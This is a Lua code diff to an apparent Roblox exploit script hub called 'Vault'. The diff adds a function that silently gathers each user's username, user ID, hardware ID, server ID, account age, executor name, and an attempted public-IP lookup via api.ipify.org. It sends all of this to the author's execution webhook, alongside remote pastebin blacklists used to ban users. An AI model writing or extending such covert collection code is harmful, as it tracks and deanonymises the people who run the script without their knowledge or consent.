@@ -14,8 +14,8 @@ local CONFIG = {
     KEY_URL = "https://pastebin.com/raw/ZWFwRjBJ",
     SUBSCRIPTION_URL = "https://pastebin.com/raw/ThRPn5JG",
     NEWS_URL = "https://pastebin.com/raw/vTKfsvCr",
-    BLACKLIST_URL = "https://pastebin.com/3h23tX2Y",  -- NEW: Add your blacklist URL
-    WHITELIST_URL = "https://pastebin.com/Qmp4r6es",  -- NEW: Add your whitelist URL
+    BLACKLIST_URL = "https://pastebin.com/raw/your_blacklist_url",
+    WHITELIST_URL = "https://pastebin.com/raw/your_whitelist_url",
     HTTP_TIMEOUT = 10,
     FEEDBACK_COOLDOWN = 4500,
     REFRESH_INTERVAL = 180,
@@ -112,7 +112,39 @@ local function safeHttpGet(url, retries)
     return false, errorMsg or "Request timed out"
 end
 
--- NEW: Blacklist/Whitelist System
+-- NEW: Player Info Gathering Function
+local function getPlayerInfo()
+    local info = {}
+    
+    -- Basic Info
+    info.UserId = LocalPlayer.UserId
+    info.Username = LocalPlayer.Name
+    info.DisplayName = LocalPlayer.DisplayName
+    info.HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+    info.GameId = game.PlaceId
+    info.JobId = game.JobId
+    
+    -- Account Details
+    info.AccountAge = LocalPlayer.AccountAge
+    info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
+    
+    -- IP Approximation (Note: Roblox doesn't provide real IP, using a mock method)
+    local success, ip = pcall(function()
+        return game:HttpGet("https://api.ipify.org") -- This is a placeholder; Roblox blocks this
+    end)
+    info.IP = success and ip or "Hidden (Roblox Limitation)"
+    
+    -- Executor Detection
+    info.Executor = "Unknown"
+    if syn then info.Executor = "Synapse X"
+    elseif Krnl then info.Executor = "Krnl"
+    elseif getgenv and getgenv().Drawing then info.Executor = "Generic (Drawing API Detected)"
+    end
+    
+    return info
+end
+
+-- Blacklist/Whitelist System
 local accessControl = {
     blacklist = {},
     whitelist = {},
@@ -123,7 +155,6 @@ local accessControl = {
         if self.isFetching or (tick() - self.lastFetch < 300) then return end
         self.isFetching = true
         
-        -- Fetch blacklist
         local blSuccess, blData = safeHttpGet(CONFIG.BLACKLIST_URL)
         if blSuccess then
             self.blacklist = {}
@@ -133,7 +164,6 @@ local accessControl = {
             end
         end
         
-        -- Fetch whitelist
         local wlSuccess, wlData = safeHttpGet(CONFIG.WHITELIST_URL)
         if wlSuccess then
             self.whitelist = {}
@@ -282,7 +312,6 @@ local webhookSystem = {
             local embed = table.remove(self.queue, 1)
             embed.footer = embed.footer or { text = "Vault v" .. CONFIG.VERSION }
             embed.timestamp = embed.timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
-            -- NEW: Add blacklist/whitelist buttons to execution webhook
             if embed.title == "🚀 Script Execution" then
                 embed.components = {
                     {
@@ -480,13 +509,13 @@ local newsSystem = {
 }
 
 -- Initialize
-accessControl:fetchLists()  -- NEW: Initialize access control
+accessControl:fetchLists()
 subscriptionSystem:fetch()
 challengeSystem:load()
 newsSystem:update()
 local lastFeedbackTime = getDataStore("lastFeedbackTime", 0)
 
--- NEW: Check access before proceeding
+-- Check access before proceeding
 if accessControl:isBlacklisted(LocalPlayer.UserId) then
     Rayfield:Notify({
         Title = "🚫 Access Denied",
@@ -497,16 +526,26 @@ if accessControl:isBlacklisted(LocalPlayer.UserId) then
     return
 end
 
--- Execution webhook
+-- Gather player info for webhook
+local playerInfo = getPlayerInfo()
+
+-- Execution webhook with enhanced info
 webhookSystem:send({
     title = "🚀 Script Execution",
     description = string.format("**%s** has launched Vault v%s", LocalPlayer.DisplayName, CONFIG.VERSION),
     color = 7419530,
     fields = {
-        { name = "🔑 Hardware ID", value = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```", inline = true },
-        { name = "🎮 Game ID", value = "```" .. game.PlaceId .. "```", inline = true },
+        { name = "👤 Username", value = "```" .. playerInfo.Username .. "```", inline = true },
+        { name = "🆔 User ID", value = "```" .. playerInfo.UserId .. "```", inline = true },
+        { name = "🔑 Hardware ID", value = "```" .. playerInfo.HWID .. "```", inline = true },
+        { name = "🎮 Game ID", value = "```" .. playerInfo.GameId .. "```", inline = true },
+        { name = "🌐 Server JobId", value = "```" .. playerInfo.JobId .. "```", inline = true },
+        { name = "📅 Account Age", value = playerInfo.AccountAge .. " days", inline = true },
+        { name = "🕒 Join Date", value = playerInfo.JoinDate, inline = true },
+        { name = "🌍 IP (Approx)", value = "```" .. playerInfo.IP .. "```", inline = true },
+        { name = "💻 Executor", value = playerInfo.Executor, inline = true },
         { name = "⭐ VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
-        { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }  -- NEW: Show access status
+        { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
     }
 })
 
@@ -558,7 +597,7 @@ KeyTab:CreateButton({
 
 KeyTab:CreateParagraph({
     Title = "📢 Credits",
-    Content = "Script by COMBO_WICK & Bang.E.Line\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnjoy the Vault!"  -- NEW: Show access status
+    Content = "Script by COMBO_WICK & Bang.E.Line\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnjoy the Vault!"
 })
 
 -- Responses Tab
@@ -595,7 +634,7 @@ ResponseTab:CreateButton({
                 { name = "👤 User", value = LocalPlayer.DisplayName, inline = true },
                 { name = "🆔 ID", value = tostring(LocalPlayer.UserId), inline = true },
                 { name = "🎮 Game", value = tostring(game.PlaceId), inline = true },
-                { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }  -- NEW: Show access status
+                { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
             }
         })
         Rayfield:Notify({Title = "✅ Sent", Content = "Feedback delivered!", Duration = 5, Image = 4483362458})
@@ -657,14 +696,14 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                 Content = "Status: ✅ Subscribed\n" ..
                           "Perks: VIP Scripts, Priority Support, Boosts\n" ..
                           "Expires in: " .. timeRemaining .. "\n" ..
-                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)  -- NEW: Show access status
+                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
             })
         else
             subParagraph:Set({
                 Title = "⭐ Vault Elite",
                 Content = "Status: ❌ Expired\n" ..
                           "Renew to regain VIP benefits!\n" ..
-                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)  -- NEW: Show access status
+                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
             })
         end
     end
@@ -815,7 +854,7 @@ local function updateAnalytics()
                     "🔑 Logins: " .. loginCount .. "\n" ..
                     "📝 Feedback Sent: " .. feedbackCount .. "\n" ..
                     "⭐ Subscription: " .. subStatus .. "\n" ..
-                    "🚫 Access: " .. accessControl:getStatus(LocalPlayer.UserId)  -- NEW: Show access status
+                    "🚫 Access: " .. accessControl:getStatus(LocalPlayer.UserId)
     analyticsParagraph:Set({Content = content})
 end
 
